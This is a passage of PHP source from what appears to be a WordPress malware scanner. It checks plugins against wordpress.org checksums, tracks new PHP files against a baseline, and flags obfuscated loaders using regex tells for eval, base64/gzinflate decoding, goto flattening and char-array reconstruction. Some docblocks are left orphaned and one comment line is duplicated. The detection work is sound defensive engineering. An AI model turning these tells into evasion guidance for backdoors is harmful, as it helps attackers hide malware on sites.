	 * ZIPs rebuilt at different SVN revisions can differ); sha256 is preferred,
	 * md5 is the fallback. Pure function, unit-tested.
	 *
	 * @return array<string, array{type:string, hashes:array<int,string>}>
	 */
	private static function parse_plugin_checksums( string $json ): array {
		$data = json_decode( $json, true );
		if ( ! is_array( $data ) || empty( $data['files'] ) || ! is_array( $data['files'] ) ) {
			return [];
		}
		$out = [];
		foreach ( $data['files'] as $relpath => $entry ) {
			if ( ! is_array( $entry ) ) continue;
			$type   = '';
			$hashes = [];
			if ( ! empty( $entry['sha256'] ) ) {
				$type   = 'sha256';
				$hashes = (array) $entry['sha256'];
			} elseif ( ! empty( $entry['md5'] ) ) {
				$type   = 'md5';
				$hashes = (array) $entry['md5'];
			}
			if ( $type === '' ) continue;
			$hashes = array_values( array_filter( array_map(
				static function ( $h ) { return strtolower( (string) $h ); },
				$hashes
			) ) );
			if ( $hashes ) {
				$out[ (string) $relpath ] = [ 'type' => $type, 'hashes' => $hashes ];
			}
		}
		return $out;
	}

	/**
	 * 1.3.89: Fetch (and cache) the wordpress.org checksums for one plugin
	 * version. Returns the parsed map, or null when the plugin is not in the .org
	 * repository / the version is not published / the network is unavailable. A
	 * negative result is cached too, so premium and custom plugins are not
	 * re-queried every scan. Network glue, kept thin; the parse and compare logic
	 * around it is what carries the tests.
	 *
	 * @return array<string, array{type:string, hashes:array<int,string>}>|null
	 */
	private static function get_plugin_checksums( string $slug, string $version ): ?array {
		if ( $slug === '' || $version === '' || ! function_exists( 'wp_remote_get' ) ) {
			return null;
		}
		$cache_key = 'wps_pcs_' . md5( $slug . '|' . $version );
		$cached    = get_transient( $cache_key );
		if ( is_array( $cached ) ) return $cached;
		if ( $cached === 'none' ) return null;

		$url  = 'https://downloads.wordpress.org/plugin-checksums/' . rawurlencode( $slug ) . '/' . rawurlencode( $version ) . '.json';
		$resp = wp_remote_get( $url, [ 'timeout' => 8, 'redirection' => 2 ] );
		if ( is_wp_error( $resp ) ) {
			return null; // transport failure: transient, do not negative-cache  retry next scan
		}
		$code = (int) wp_remote_retrieve_response_code( $resp );
		if ( $code === 404 || $code === 410 ) {
			// Definitively not in the wordpress.org repository (premium / custom).
			set_transient( $cache_key, 'none', self::PLUGIN_CHECKSUMS_TTL );
			return null;
		}
		if ( $code !== 200 ) {
			return null; // 403 / 429 / 5xx: transient, do not cache  retry next scan
		}
		$parsed = self::parse_plugin_checksums( (string) wp_remote_retrieve_body( $resp ) );
		if ( ! $parsed ) {
			set_transient( $cache_key, 'none', self::PLUGIN_CHECKSUMS_TTL );
			return null; // endpoint exists but published no usable hashes
		}
		set_transient( $cache_key, $parsed, self::PLUGIN_CHECKSUMS_TTL );
		return $parsed;
	}

	/**
	 * 1.3.89: Read the declared Version from a plugin's header (its main file or
	 * any top-level PHP carrying the Plugin Name header). Empty when undeterminable.
	 */
	private static function read_plugin_version( string $dir, string $slug ): string {
		$candidates = [ $dir . '/' . $slug . '.php', $dir . '/index.php' ];
		foreach ( (array) @glob( $dir . '/*.php' ) as $php ) {
			$candidates[] = $php;
		}
		foreach ( $candidates as $main ) {
			if ( ! is_file( $main ) ) continue;
			$head = @file_get_contents( $main, false, null, 0, 8192 );
			if ( is_string( $head )
				&& stripos( $head, 'Plugin Name:' ) !== false
				&& preg_match( '/^[ \t\/*#@]*Version:\s*([0-9][0-9A-Za-z._\-]*)/mi', $head, $m ) ) {
				return trim( $m[1] );
			}
		}
		return '';
	}

	/**
	 * 1.3.89: Compare a plugin folder against a checksum manifest. Flags PHP files
	 * whose hash matches no whitelisted value (MODIFIED  injection into a real
	 * plugin file) and PHP files absent from the manifest (EXTRA  a planted file
	 * inside a legitimate plugin). Non-PHP files are not verified, to stay off the
	 * "soft changes" wp-cli itself ignores by default. Pure function, unit-tested.
	 *
	 * @param array<string, array{type:string, hashes:array<int,string>}> $checksums
	 * @return array{modified:array<int,string>, extra_php:array<int,string>}
	 */
	/**
	 * 1.4.46: how long this scan may actually run.
	 *
	 * Derived from max_execution_time rather than assumed, because a budget
	 * larger than the limit PHP enforces is not a budget at all. Leaves
	 * headroom so the request can still render a page after the scan stops.
	 *
	 * A limit of 0 means unlimited (CLI, or a host that has removed it), in
	 * which case the ceiling applies.
	 */
	/**
	 * 1.4.46: the scan deadline, as an absolute moment.
	 *
	 * The budget existed but was only consulted BETWEEN checks. A single check
	 * that ran past it blew through unimpeded, which is exactly what happened:
	 * nine content checks added between 1.4.33 and 1.4.43 each walk the tree
	 * twice and read every PHP file, and on a real site the first of them can
	 * exhaust a thirty-second limit on its own.
	 *
	 * A bound only checked at the boundary between units of work is not a
	 * bound on a unit of work. This is the same lesson as 1.4.13, where an
	 * A bound only checked at the boundary between units of work is not a bound on a unit of work.
	 * unbounded per-request write took a site down: the limit has to sit at
	 * the point the work actually happens.
	 *
	 * Set once at the start of a scan and consulted inside every file loop.
	 */
	private static $deadline = 0.0;

	public static function start_deadline(): void {
		self::$deadline = microtime( true ) + self::scan_budget_seconds();
	}

	/** True once the scan has used its time. Cheap enough to call per file. */
	public static function out_of_time(): bool {
		return self::$deadline > 0.0 && microtime( true ) > self::$deadline;
	}

	public static function scan_budget_seconds(): float {
		$max = (int) ini_get( 'max_execution_time' );
		if ( $max <= 0 ) {
			return (float) self::SCAN_TIME_BUDGET_SECONDS;
		}
		$usable = $max - self::SCAN_BUDGET_HEADROOM;
		if ( $usable < 5 ) {
			$usable = max( 5, (int) floor( $max * 0.6 ) );
		}
		return (float) min( self::SCAN_TIME_BUDGET_SECONDS, $usable );
	}

	/**
	 * 1.4.46: has this scan run out of time?
	 *
	 * Checked INSIDE the long-running checks, not only between them. A single
	 * check that walks and hashes every file in every plugin can exceed the
	 * whole budget on its own, and stopping between checks cannot help once
	 * that has started.
	 */
	public static function scan_budget_exceeded(): bool {
		if ( ! isset( $GLOBALS['wps_scan_started'] ) ) {
			return false;
		}
		return ( microtime( true ) - (float) $GLOBALS['wps_scan_started'] ) > self::scan_budget_seconds();
	}

	private static function compare_plugin_files( string $plugin_dir, array $checksums ): array {
		$modified  = [];
		$extra_php = [];
		$real_root = realpath( $plugin_dir );
		if ( ! $real_root ) {
			// 1.4.60: an unresolvable directory is a FAILURE to check, not a
			// clean result. Every return from this function now carries an
			// explicit status so the caller cannot mistake "did not run" for
			// "found nothing".
			return [
				'modified'  => $modified,
				'extra_php' => $extra_php,
				'status'    => 'failed',
				'reason'    => 'plugin directory could not be resolved',
			];
		}
		$root_len = strlen( $real_root );
		$count    = 0;
		$complete = true;
		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( $plugin_dir, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			// 1.4.60 (CRIT-001): this loop iterated $iterator - a variable that
			// was never assigned. PHP emitted two warnings, foreach received
			// null, the body never executed, and the function returned two
			// empty arrays. Warnings are not exceptions, so the catch below
			// never fired and the caller read the empty result as "no
			// modifications". Reproduced against a plugin carrying both an
			// injected eval() and a planted backdoor: both reported clean.
			//
			// The rename is one character. The reason it survived is that a
			// silent scanner and a scanner finding nothing were indistinguishable
			// from the outside, which is why every path out of here now states
			// whether it actually ran.
			foreach ( $iter as $file ) {
				// 1.4.46: this loop hashes every file in every plugin. It is
				// the one that exceeded max_execution_time on a live site, and
				// it had no interruption of any kind - a cap on file COUNT does
				// not help when the cost per file is a hash.
				if ( self::scan_budget_exceeded() ) {
					$complete = false; // ran out of time: partial, not clean
					break;
				}
				if ( $count++ > self::REDROP_MAX_SCAN_FILES ) {
					$complete = false; // hit the file cap: partial, not clean
					break;
				}
				if ( ! ( $file instanceof SplFileInfo ) || ! $file->isFile() ) continue;
				$real = realpath( $file->getPathname() );
				if ( ! $real ) continue;
				$rel    = ltrim( str_replace( '\\', '/', substr( $real, $root_len ) ), '/' );
				$is_php = in_array( strtolower( $file->getExtension() ), self::PHP_INVENTORY_EXTS, true );

				if ( isset( $checksums[ $rel ] ) ) {
					if ( ! $is_php ) continue; // only verify executable manifest files
					$entry = $checksums[ $rel ];
					$local = @hash_file( $entry['type'], $real );
					if ( $local === false ) continue;
					if ( ! in_array( strtolower( $local ), $entry['hashes'], true ) ) {
						$modified[] = $rel;
					}
				} elseif ( $is_php ) {
					$extra_php[] = $rel; // PHP file not in the official distribution
				}
			}
		} catch ( \Throwable $e ) {
			// 1.4.60: Throwable, not Exception. A TypeError or ValueError from
			// the iterator is an Error, which \Exception does not catch, so the
			// previous handler would have let an engine-level failure escape
			// while still looking like it had a handler.
			WPS_Logger::write( 'plugin-integrity compare error: ' . $e->getMessage() );
			return [
				'modified'  => $modified,
				'extra_php' => $extra_php,
				'status'    => 'failed',
				'reason'    => get_class( $e ) . ': ' . $e->getMessage(),
			];
		}
		return [
			'modified'  => $modified,
			'extra_php' => $extra_php,
			'status'    => $complete ? 'complete' : 'incomplete',
			'reason'    => $complete ? '' : 'traversal stopped early (time budget or file cap)',
		];
	}

	/**
	 * 1.3.89: Plugin integrity against wordpress.org. For each installed repo
	 * plugin, fetch the official checksums for its declared version and flag any
	 * PHP file that was modified or planted. This catches injection into a
	 * legitimate plugin  the blind spot the new-file tripwire (1.3.87) cannot see,
	 * since a modified existing file is not "new"  and it works on first scan with
	 * no clean baseline, because the reference is the official distribution.
	 * Premium/custom plugins (no .org checksums) are skipped. Findings are
	 * review-only; a tampered repo file should be restored by reinstalling, not
	 * deleted. Network fetches are cached for a week and capped per scan.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_plugin_integrity(): array {
		$found = [];
		if ( ! defined( 'WP_PLUGIN_DIR' ) || ! is_dir( WP_PLUGIN_DIR ) ) {
			return $found;
		}
		$allow   = self::clickfix_heuristic_allowlist();
		$entries = @scandir( WP_PLUGIN_DIR );
		if ( ! is_array( $entries ) ) {
			return $found;
		}
		$fetches = 0;
		$unverifiable = [];

		foreach ( $entries as $slug ) {
			if ( $slug === '.' || $slug === '..' ) continue;
			$dir = rtrim( WP_PLUGIN_DIR, '/\\' ) . DIRECTORY_SEPARATOR . $slug;
			if ( ! is_dir( $dir ) || in_array( $slug, $allow, true ) ) continue;

			$version = self::read_plugin_version( $dir, $slug );
			if ( $version === '' ) continue;

			// Respect a per-scan network budget for not-yet-cached plugins; the
			// rest are picked up on subsequent scans and then served from cache.
			$cache_key = 'wps_pcs_' . md5( $slug . '|' . $version );
			if ( get_transient( $cache_key ) === false ) {
				if ( $fetches >= self::PLUGIN_CHECKSUMS_FETCH_CAP ) continue;
				$fetches++;
			}
			$checksums = self::get_plugin_checksums( $slug, $version );
			if ( ! is_array( $checksums ) || ! $checksums ) {
				// A 'none' cache means .org answered 404: definitively not a repo
				// plugin (premium / custom), so integrity cannot be verified. No
				// cache means a transient failure  do not list it; retry next scan.
				if ( get_transient( $cache_key ) === 'none' ) {
					$unverifiable[] = $slug . ' ' . $version;
				}
				continue;
			}

			$diff = self::compare_plugin_files( $dir, $checksums );
			foreach ( $diff['modified'] as $rel ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'Repo plugin file modified vs wordpress.org distribution',
					'subject'  => $slug . '/' . $rel,
					'path'     => $dir . DIRECTORY_SEPARATOR . str_replace( '/', DIRECTORY_SEPARATOR, $rel ),
					'action'   => 'This PHP file does not match the official wordpress.org checksum for ' . $slug . ' ' . $version . '. A legitimate plugin file has been altered  treat it as code injection. Restore it by reinstalling the plugin from a clean copy rather than deleting it.',
				];
			}
			foreach ( $diff['extra_php'] as $rel ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'Extra PHP file inside a repo plugin (not in wordpress.org distribution)',
					'subject'  => $slug . '/' . $rel,
					'path'     => $dir . DIRECTORY_SEPARATOR . str_replace( '/', DIRECTORY_SEPARATOR, $rel ),
					'action'   => 'This PHP file is not part of the official ' . $slug . ' ' . $version . ' distribution  a file planted inside a legitimate plugin folder. Review it; if you do not recognise it, delete it.',
				];
			}
		}

		// Standing awareness, not an alert: list the installed plugins that have
		// no wordpress.org baseline, so the supply-chain blind spot is visible.
		// Low severity (the scan only emails on 'critical'), one aggregated line.
		// 1.4.11: plugins the operator has declared as their own are removed from
		// this list. They are not "unverifiable" in any meaningful sense - the
		// operator wrote them, and wordpress.org has no baseline to offer for
		// code that was never published there. They are covered instead by
		// check_first_party_integrity(), which watches their files for changes
		// that arrive without a version bump.
		$first_party = self::first_party_slugs();
		if ( $first_party ) {
			$unverifiable = array_values( array_filter(
				$unverifiable,
				static function ( $entry ) use ( $first_party ) {
					$slug = strtolower( trim( (string) strtok( (string) $entry, ' ' ) ) );
					return ! in_array( $slug, $first_party, true );
				}
			) );
		}

		if ( $unverifiable ) {
			sort( $unverifiable );
			$shown = array_slice( $unverifiable, 0, 15 );
			$more  = count( $unverifiable ) - count( $shown );
			$list  = implode( ', ', $shown ) . ( $more > 0 ? ', +' . $more . ' more' : '' );
			$found[] = [
				'severity' => 'low',
				'type'     => 'Installed plugins without a wordpress.org integrity baseline',
				'subject'  => count( $unverifiable ) . ' plugin(s) cannot be checksum-verified',
				'path'     => '',
				'action'   => 'These plugins are not in the wordpress.org repository, so their files cannot be checked against an official baseline: ' . $list . '. That is normal for premium or custom plugins. It does mean a supply-chain compromise of one of them  like the June 2026 ShapedPlugin Pro backdoor pushed through the vendor update channel  would not be caught by checksum integrity. Keep them updated from the vendor, and treat unexpected admin-page outbound requests or unfamiliar new admin accounts as suspicious.',
			];
		}
		return $found;
	}


	/**
	 * 1.3.87: Walk the directories that should never legitimately gain new PHP
	 * (uploads and mu-plugins) and return a realpath => sha256 map, bounded. Raw
	 * material for the baseline drift tripwire below.
	 *
	 * @return array<string, string>
	 */
	private static function scan_php_inventory(): array {
		$roots = [];
		if ( defined( 'WPMU_PLUGIN_DIR' ) ) {
			$roots[] = WPMU_PLUGIN_DIR;
		}
		if ( function_exists( 'wp_upload_dir' ) ) {
			$u = wp_upload_dir();
			if ( ! empty( $u['basedir'] ) ) {
				$roots[] = $u['basedir'];
			}
		}
		$roots = array_values( array_filter( array_unique( $roots ), 'is_dir' ) );

		$inv     = [];
		$visited = 0;
		foreach ( $roots as $root ) {
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $file ) {
					if ( $visited++ > self::PHP_INVENTORY_MAX_VISIT ) break;
					if ( ! ( $file instanceof SplFileInfo ) || ! $file->isFile() ) continue;
					if ( ! in_array( strtolower( $file->getExtension() ), self::PHP_INVENTORY_EXTS, true ) ) continue;
					if ( $file->getSize() > 2 * 1024 * 1024 ) continue; // skip >2 MiB
					$real = realpath( $file->getPathname() );
					if ( ! $real ) continue;
					$hash = @hash_file( 'sha256', $real );
					if ( $hash ) {
						$inv[ $real ] = $hash;
					}
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'php-inventory scan error: ' . $e->getMessage() );
			}
		}
		return $inv;
	}

	/**
	 * 1.3.87: Capture the current PHP inventory as the clean baseline. Called on
	 * the first scan (no baseline yet) and by the manual "Reset PHP-inventory
	 * baseline" action after a cleanup. Returns the file count.
	 */
	public static function establish_php_inventory_baseline(): int {
		$inv = self::scan_php_inventory();
		update_option( self::PHP_INVENTORY_BASELINE_OPTION, $inv, false );
		return count( $inv );
	}

	/**
	 * 1.3.87: Tripwire. Flags any PHP file that has APPEARED or CHANGED in uploads
	 * or mu-plugins since the clean baseline, regardless of what the file
	 * contains. The content detectors catch known shapes; this catches the unknown
	 * by deviation  a novel strain dropping a loader into uploads or a re-dropper
	 * into mu-plugins trips here on first appearance, before it is catalogued.
	 *
	 * When no baseline exists yet (fresh install) it establishes the baseline and
	 * flags nothing, since it cannot know which existing files are clean: the
	 * content detectors cover pre-existing malware, this covers what arrives
	 * afterwards. Anomalies are surfaced for review, never auto-deleted.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_php_inventory_drift(): array {
		$found    = [];
		$baseline = get_option( self::PHP_INVENTORY_BASELINE_OPTION, null );
		$current  = self::scan_php_inventory();

		if ( ! is_array( $baseline ) ) {
			update_option( self::PHP_INVENTORY_BASELINE_OPTION, $current, false );
			WPS_Logger::log_event( 'php_inventory_baseline_established', count( $current ) . ' files' );
			return $found;
		}

		foreach ( $current as $path => $hash ) {
			if ( ! isset( $baseline[ $path ] ) ) {
				$found[] = [
					'severity' => 'critical',
					'type'     => 'New PHP file since clean baseline (uploads / mu-plugins)',
					'subject'  => $path,
					'path'     => $path,
					'action'   => 'A PHP file appeared in a directory that should not gain new code after the baseline was set. Review it; if malicious, delete it, then Reset the PHP-inventory baseline.',
				];
			} elseif ( $baseline[ $path ] !== $hash ) {
				$found[] = [
					'severity' => 'high',
					'type'     => 'PHP file changed since clean baseline (uploads / mu-plugins)',
					'subject'  => $path,
					'path'     => $path,
					'action'   => 'A PHP file in uploads or mu-plugins changed since the baseline. Review the change; once confirmed clean, Reset the PHP-inventory baseline.',
				];
			}
		}
		return $found;
	}

	/**
	 * 1.3.83: Detect plugins that ship an externalized, obfuscated payload behind
	 * a thin loader that reads + decodes + evals it. The page-image-scanner family
	 * stores the real payload in a non-PHP blob (e.g. storage/state.pkg) while the
	 * main <slug>.php is a sub-1KB stub that requires a sibling loader, so the
	 * shape heuristic (which scores the main file) and the signature scan (the
	 * blob is compressed and not .php) both miss it. The catch is the
	 * read + decode + eval chain co-occurring in one bundled PHP file.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_external_payload_loader(): array {
		$found = [];
		if ( ! defined( 'WP_PLUGIN_DIR' ) || ! is_dir( WP_PLUGIN_DIR ) ) return $found;

		$self_dir  = defined( 'WPS_DIR' ) ? realpath( WPS_DIR ) : false;
		$known_ext = [ 'php','txt','md','pot','po','mo','json','css','js','scss','less','html','htm','xml','yml','yaml','svg','png','jpg','jpeg','gif','webp','ico','woff','woff2','ttf','eot','csv','sql','lock','dist','map' ];
		$loaders = []; // plugin folder => loader filename (reads + decodes a file)
		$blobs   = []; // plugin folder => opaque bundled blob rel path
		$obf     = []; // plugin folder => has an obfuscation tell (split include / substitution loop)
		$scanned = 0;

		try {
			$iter = new RecursiveIteratorIterator(
				new RecursiveDirectoryIterator( WP_PLUGIN_DIR, FilesystemIterator::SKIP_DOTS ),
				RecursiveIteratorIterator::LEAVES_ONLY
			);
			foreach ( $iter as $file ) {
				if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
				if ( ! ( $file instanceof SplFileInfo ) || ! $file->isFile() ) continue;

				$path = $file->getPathname();
				$real = realpath( $path );
				if ( ! $real ) continue;
				if ( $self_dir && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;

				$folder = self::get_plugin_folder( $path );
				if ( ! $folder ) continue;

				$ext = strtolower( $file->getExtension() );
				if ( in_array( $ext, self::PHP_INVENTORY_EXTS, true ) ) {
					if ( ! $file->isReadable() ) continue;
					$contents = @file_get_contents( $path );
					if ( $contents === false || $contents === '' ) continue;
					if ( self::is_whitelisted( $contents ) ) continue;

					// Obfuscation tell: a split-string include/require path, or a
					// chr(ord($table[ord(...))) substitution-decode loop. Legitimate
					// plugins do not write either; malware uses them to hide the
					// loader target and the payload transform.
					if ( ! isset( $obf[ $folder ] ) ) {
						if ( preg_match( '/(?:include|require)(?:_once)?\b[^;\n]*?[\'"][^\'"\n;]*[\'"]\s*\.\s*[\'"]/', $contents )
							|| preg_match( '/chr\s*\(\s*ord\s*\(\s*\$\w+\s*\[\s*ord\s*\(/', $contents ) ) {
							$obf[ $folder ] = true;
						}
					}

					if ( ! isset( $loaders[ $folder ] ) ) {
						$reads = strpos( $contents, 'file_get_contents' ) !== false || strpos( $contents, 'fread' ) !== false;
						$decodes = strpos( $contents, 'gzinflate' ) !== false
							|| strpos( $contents, 'gzuncompress' ) !== false
							|| strpos( $contents, 'base64_decode' ) !== false
							|| strpos( $contents, 'str_rot13' ) !== false
							|| (bool) preg_match( '/chr\s*\(\s*ord\s*\(/', $contents );
						if ( $reads && $decodes ) {
							$loaders[ $folder ] = $file->getFilename();
						}
					}
				} elseif ( $ext !== '' && ! in_array( $ext, $known_ext, true ) && $file->getSize() > 512 ) {
					if ( ! isset( $blobs[ $folder ] ) ) {
						$blobs[ $folder ] = ltrim( substr( $real, strlen( $folder ) ), DIRECTORY_SEPARATOR );
					}
				}
			}
		} catch ( \Exception $e ) {
			WPS_Logger::write( 'external-payload scan error: ' . $e->getMessage() );
		}

		// Require all three cues: a read+decode loader file, an opaque bundled
		// payload blob, and an obfuscation tell. Any one or two alone occur in
		// legitimate plugins; the trio is the externalized-payload fake-plugin shape.
		foreach ( $loaders as $folder => $loader_file ) {
			if ( ! isset( $blobs[ $folder ] ) || ! isset( $obf[ $folder ] ) ) continue;
			$found[] = [
				'severity'    => 'critical',
				'type'        => 'Plugin with externalized obfuscated payload loader (reads + decodes a bundled blob)',
				'subject'     => basename( $folder ),
				'path'        => $folder . DIRECTORY_SEPARATOR . $loader_file,
				'action'      => 'Delete this plugin folder. ' . $loader_file . ' reads and decodes a bundled non-PHP payload blob (' . $blobs[ $folder ] . ') behind an obfuscated loader, the hallmark of an externalized-payload fake plugin.',
				'match'       => 'decode-loader (' . $loader_file . ') + bundled blob (' . $blobs[ $folder ] . ') + obfuscation tell',
				'auto_delete' => true,
				'delete_path' => $folder,
			];
		}

		return $found;
	}

	/**
	 * 1.3.83: Detect and remove the doorway-spam + backdoor panel kit
	 * (annealing/resweep family) that co-resides with the ClickFix campaign. It is
	 * not a WordPress plugin but a standalone PHP kit dropped into the webroot,
	 * identified by a small, stable set of structural tells inside a `core/`
	 * directory: a misspelled "backdor" backdoor file, hex-suffixed panel_ /
	 * filemanager_ files, and an ipManager/linkManager/settingsManager module set.
	 * Auto-deletion is gated on several co-occurring tells (the near-unique
	 * "backdor" misspelling counts double) and on a protected-path guard so the
	 * routine can never remove a real WordPress directory.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	/**
	 * 1.4.1: find the doorway kit by its CLOAKING CONFIG rather than its
	 * folder layout. The structural detector (check_doorway_backdoor_kit)
	 * keys on a directory literally named `core/`, which a single rename
	 * defeats - confirmed against a live sample. The configuration cannot be
	 * renamed away without breaking the kit: it must be readable, parseable,
	 * and carry the allow/deny lists that decide who is shown spam.
	 *
	 * The fingerprint is a JSON file carrying several
	 * WPS_Indicators::doorway_cloak_config_keys() together, with at least one
	 * blocklist array large enough to be an evasion list rather than a
	 * configuration choice. A handful of blocked IPs is a site setting; tens
	 * of thousands is a kit hiding from crawlers and hosting providers.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	/**
	 * 1.4.3: detect control-flow-flattened PHP loaders - the "goto packer"
	 * shape. Confirmed blind spot: a live sample passed all eleven existing
	 * detectors because it contains no recognisable malicious string at all.
	 * Every function name is rebuilt at runtime from single-character array
	 * offsets, the control flow is shredded into goto/label hops, and the
	 * actual payload is a compressed blob handed to one eval.
	 *
	 * Signature-matching cannot see this, so the technique is what gets
	 * detected. Each tell alone is legal PHP; together they describe code
	 * written specifically to be unreadable:
	 *
	 *   1. goto statements with matching labels (control-flow flattening).
	 *      Legitimate WordPress code effectively never uses goto.
	 *   2. Character-array reconstruction - long runs of $var[12] . $var[7]
	 *      concatenations that assemble function names to defeat grep.
	 *   3. Packed layout: kilobytes of code on almost no lines.
	 *   4. A large encoded blob (base64/hex) held in a single token.
	 *   5. eval, or an equivalent dynamic-execution primitive.
	 *
	 * Remediation is deliberately split. In "stub position" - an index.php
	 * whose canonical form is the 20-30 byte "Silence is golden" placeholder -
	 * a packed obfuscated loader is malware with no legitimate reading, so it
	 * is removed (into quarantine by default, therefore recoverable).
	 * Anywhere else it is reported for review, because commercial plugins are
	 * occasionally shipped through obfuscators and deleting a licensed
	 * plugin's main file would break a working site.
	 *
	 * @return array<int, array<string, string|bool>>
	 */
	private static function check_obfuscated_goto_backdoor(): array {
		$found    = [];
		$self_dir = defined( 'WPS_DIR' ) ? ( realpath( WPS_DIR ) ?: '' ) : '';
		$scanned  = 0;
		$seen     = [];

		$roots = [];
		if ( defined( 'WP_CONTENT_DIR' ) ) $roots[] = WP_CONTENT_DIR;
		if ( defined( 'ABSPATH' ) )        $roots[] = rtrim( ABSPATH, '/\\' );

		foreach ( array_unique( $roots ) as $root ) {
			if ( ! is_dir( $root ) ) continue;
			try {
				$iter = new RecursiveIteratorIterator(
					new RecursiveDirectoryIterator( $root, FilesystemIterator::SKIP_DOTS ),
					RecursiveIteratorIterator::LEAVES_ONLY
				);
				foreach ( $iter as $f ) {
					if ( $scanned++ > self::REDROP_MAX_SCAN_FILES ) break;
					if ( ! ( $f instanceof SplFileInfo ) ) continue;
					if ( ! self::is_php_executable( $f ) || ! $f->isReadable() ) continue;
					$size = $f->getSize();
					// Floor is deliberately low: a complete packer can fit in well
					// under a kilobyte, and the tell-count below is what actually
					// decides. Ceiling keeps very large legitimate files out.
					if ( $size < 600 || $size > 2097152 ) continue;

					$path = $f->getPathname();
					$real = realpath( $path );
					if ( $self_dir !== '' && $real && ( $real === $self_dir || WPS_Utils::path_is_inside( $real, WPS_DIR ) ) ) continue;
					if ( class_exists( 'WPS_Quarantine' ) && WPS_Quarantine::is_quarantine_path( $path ) ) continue;
					if ( isset( $seen[ (string) $real ] ) ) continue;
					$seen[ (string) $real ] = true;

					$contents = @file_get_contents( $path );
					if ( $contents === false || $contents === '' ) continue;
					if ( self::is_whitelisted( $contents ) ) continue;

					$tells = [];

					// (1) control-flow flattening
					$gotos  = preg_match_all( '/\bgoto\s+[A-Za-z0-9_]+\s*;/', $contents );
					$labels = preg_match_all( '/(?:^|;)\s*[A-Za-z0-9_]{2,}\s*:(?!:)/m', $contents );
					if ( $gotos >= 3 && $labels >= 3 ) {
						$tells[] = 'goto/label control-flow flattening (' . $gotos . ' jumps)';
					}

					// (2) character-array function-name reconstruction
					$pieces = preg_match_all( '/\$[A-Za-z0-9_]+\s*\[\s*\d{1,3}\s*\]\s*\./', $contents );
					if ( $pieces >= 10 ) {
						$tells[] = 'runtime string reconstruction from char array (' . $pieces . ' fragments)';
					}

					// (3) packed layout - lots of bytes, almost no lines
					$lines = substr_count( $contents, "\n" ) + 1;
					if ( $size > 2048 && $lines <= 12 ) {
						$tells[] = 'packed layout (' . size_format( $size ) . ' across ' . $lines . ' line' . ( $lines === 1 ? '' : 's' ) . ')';
					}

					// (4) a large encoded blob in a single token
					$blob = 0;
					if ( preg_match_all( '/[A-Za-z0-9+\/=]{300,}/', $contents, $bm ) ) {
						foreach ( $bm[0] as $b ) { if ( strlen( $b ) > $blob ) $blob = strlen( $b ); }
					}
					if ( $blob >= 500 ) {
						$tells[] = 'embedded encoded payload (' . number_format( $blob ) . ' chars)';
					}

					// (5) dynamic execution primitive
					$has_exec = (bool) preg_match( '/\beval\s*\(|\bassert\s*\(|\bcreate_function\s*\(|\bpreg_replace\s*\([^)]*[\'"]\/\w*e\w*[\'"]/i', $contents );
					if ( $has_exec ) {
						$tells[] = 'dynamic execution (eval/assert/create_function)';
					}

					// Three independent tells, and one of them must be an
					// actual execution or payload tell rather than layout alone.
					if ( count( $tells ) < 3 || ( ! $has_exec && $blob < 500 ) ) continue;

					// Stub position: a file whose canonical content is a
					// placeholder. Nothing legitimate is ever packed there.
					$base      = strtolower( $f->getFilename() );
					$in_stub   = ( $base === 'index.php' );
					$sib_note  = '';
					if ( $in_stub ) {
						// Corroborate with sibling stubs elsewhere in the same
						// plugin/theme: 26-byte "Silence is golden" files next
						// to a 19 KB packed one is the whole story.
						$parent  = dirname( $path );
						$stubs   = 0;
						// Subdirectories of the SAME plugin/theme: admin/,
						// includes/, languages/ all carry the canonical stub.
						foreach ( (array) @glob( $parent . '/*/index.php' ) as $sib ) {
							if ( realpath( $sib ) !== $real && @filesize( $sib ) < 256 ) $stubs++;
						}
						if ( $stubs > 0 ) {
							$sib_note = ' ' . $stubs . ' sibling index.php file' . ( $stubs === 1 ? ' is a' : 's are' )
								. ' normal placeholder stub' . ( $stubs === 1 ? '' : 's' ) . ', which makes this one conspicuous.';
						}
					}

					$finding = [
						'severity' => 'critical',
						'type'     => 'Obfuscated PHP loader (control-flow flattened)',
						'subject'  => basename( dirname( $path ) ) . '/' . basename( $path ),
						'path'     => $path,
						'match'    => implode( '; ', $tells ),
					];

					if ( $in_stub ) {
						$finding['action']      = 'This file is a packed, deliberately unreadable PHP loader sitting where WordPress expects a placeholder.'
							. $sib_note
							. ' An index.php in a plugin or theme directory is normally a one-line "Silence is golden" stub, so there is no legitimate reading of this file - it is a backdoor hidden inside an otherwise real plugin. It has been removed; check the rest of the directory too, since the surrounding plugin may be genuine software used as camouflage.';
						$finding['auto_delete'] = true;
						$finding['delete_path'] = $path;
					} else {
						$finding['action']      = 'This file is written to be unreadable: ' . implode( ', ', $tells )
							. '. That is the shape of a packed backdoor, and no signature will match it because every name is rebuilt at runtime. Reported for review rather than deleted, because a small number of commercial plugins ship through obfuscators - confirm what this file belongs to before removing it. If you cannot account for it, treat it as a backdoor and rotate every credential the site uses.';
					}

					$found[] = $finding;
				}
			} catch ( \Exception $e ) {
				WPS_Logger::write( 'obfuscated-loader scan error: ' . $e->getMessage() );
			}
		}

		return $found;
	}

	/**
	 * 1.4.3: directory index stubs that are not stubs.
	 *
	 * WordPress convention puts a tiny placeholder index.php - the familiar
	 * "Silence is golden" one-liner - in plugin, theme, and upload directories
	 * to stop directory listing. The file is therefore one of the few in a
	 * WordPress tree with a known-benign canonical form, and almost nobody
	 * ever reads it. That combination makes it a favourite hiding place.
	 *
	 * This check is deliberately independent of HOW the payload is written:
	 * it flags the position, so it still fires on a plain, unobfuscated
	 * backdoor that the packer detector above would miss. It carries real
